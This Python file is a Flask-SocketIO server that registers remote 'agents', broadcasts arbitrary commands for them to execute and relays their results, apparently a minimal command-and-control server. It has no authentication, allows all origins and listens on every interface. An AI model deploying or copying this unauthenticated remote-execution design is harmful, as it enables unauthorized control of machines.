from flask import Flask
from flask_socketio import SocketIO, emit
import time

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", allow_unsafe_werkzeug=True)

agents = []

@app.route('/')
def home():
    return f"Active Agents: {len(agents)}"

@socketio.on('connect')
def connect():
    print("Client connected")

@socketio.on('register')
def register(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id not in agents:
        agents.append(agent_id)
        emit('registered', {'status': 'ok'})
        emit('agent_online', {'agent_id': agent_id}, broadcast=True)
        print(f"Agent registered: {agent_id}")

@socketio.on('get_agents')
def get_agents():
    emit('agents_list', {'agents': agents})

@socketio.on('connect_agent')
def connect_agent(data):
    agent_id = data.get('agent_id')
    if agent_id in agents:
        emit('connected', {'agent_id': agent_id})

@socketio.on('send_command')
def send_command(data):
    emit('execute', {'command': data.get('command')}, broadcast=True)

@socketio.on('result')
def result(data):
    emit('result', data, broadcast=True)

@socketio.on('disconnect')
def disconnect():
    print("Client disconnected")

if __name__ == '__main__':
    print("Simple Server Starting...")
    socketio.run(app, host='0.0.0.0', port=5000)
